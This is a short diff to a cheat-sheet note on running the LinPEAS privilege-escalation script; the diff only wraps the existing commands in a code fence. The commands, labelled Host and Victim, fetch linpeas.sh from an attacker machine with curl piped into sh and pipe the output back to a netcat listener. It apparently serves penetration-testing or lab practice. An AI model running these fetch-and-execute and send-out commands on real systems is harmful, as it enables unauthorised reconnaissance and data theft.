@@ -1,4 +1,6 @@
 `HOW TO USE LINPEAS`
+
+```
 #Local network
  sudo python -m SimpleHTTPServer 80 #Host
  curl 10.10.10.10/linpeas.sh | sh #Victim
@@ -10,3 +12,4 @@
  #Excute from memory and send output back to the host
  nc -lvnp 9002 | tee linpeas.out #Host
  curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
+```
